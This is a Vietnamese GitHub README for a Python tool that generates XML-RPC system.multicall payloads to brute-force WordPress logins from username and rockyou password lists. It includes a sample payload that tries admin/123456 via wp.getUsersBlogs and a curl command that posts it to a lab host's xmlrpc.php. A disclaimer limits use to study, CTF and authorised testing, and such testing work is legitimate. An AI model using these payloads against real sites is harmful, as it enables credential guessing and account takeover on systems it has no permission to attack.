# XML-RPC Bruteforce Payload Generator

## 📌 Giới thiệu
Script Python này giúp **tự động tạo file payload XML** để brute-force endpoint `xmlrpc.php` (WordPress) bằng phương thức `system.multicall`.  
Người dùng chỉ cần cung cấp **file user.txt** (danh sách username) và **file rockyou.txt** (danh sách password).

---

## 🚀 Tính năng
- ✅ Tạo payload XML cho brute-force XML-RPC.
- ✅ Hỗ trợ `system.multicall` để gửi nhiều credential trong 1 request.
- ✅ Cho phép giới hạn số password thử trên mỗi user.

---

## 📂 Cấu trúc
```
.
├── generator.py      # Script chính
├── user.txt          # Danh sách username
├── rockyou.txt       # Danh sách password
└── payload.xml       # File payload XML sau khi generate
```

---

## 🔧 Cách sử dụng
### 1️⃣ Chạy script
```bash
python generator.py
```
<img width="412" height="113" alt="image" src="https://github.com/user-attachments/assets/0fa90754-adf0-444a-924c-a1f305374cb5" />

### 2️⃣ Nhập thông tin:
- Đường dẫn đến file `user.txt`
- Đường dẫn đến file `rockyou.txt`
- Tên file output (mặc định: payload.xml)
- Số mật khẩu tối đa mỗi user (mặc định: 5)

---

## ⚡ Ví dụ chạy:
```bash
Nhập đường dẫn file user.txt: users.txt
Nhập đường dẫn file rockyou.txt: passwords.txt
Nhập tên file output (mặc định payload.xml): payload.xml
Số mật khẩu tối đa mỗi user (mặc định 5): 5
[+] Payload đã được tạo và lưu vào payload.xml
```

---

## 📌 Ví dụ payload (trích)
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name><value><array><data>
                  <value><string>admin</string></value>
                  <value><string>123456</string></value>
                </data></array></value></member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```
Sử dụng để test 
```
┌──(huyqa㉿kali)-[~] └─$ curl -d @payload.xml http://192.168.233.144/xmlrpc.php
```
<img width="795" height="668" alt="image" src="https://github.com/user-attachments/assets/be7ea991-dd9b-4632-89ba-ca45b1f48a57" />

---

## ⚠️ Lưu ý
⚠️ Tool chỉ phục vụ **mục đích học tập, CTF, pentest hợp pháp**.  
⚠️ **Không sử dụng để tấn công hệ thống khi chưa có sự cho phép.**

---

## 📜 License
MIT License
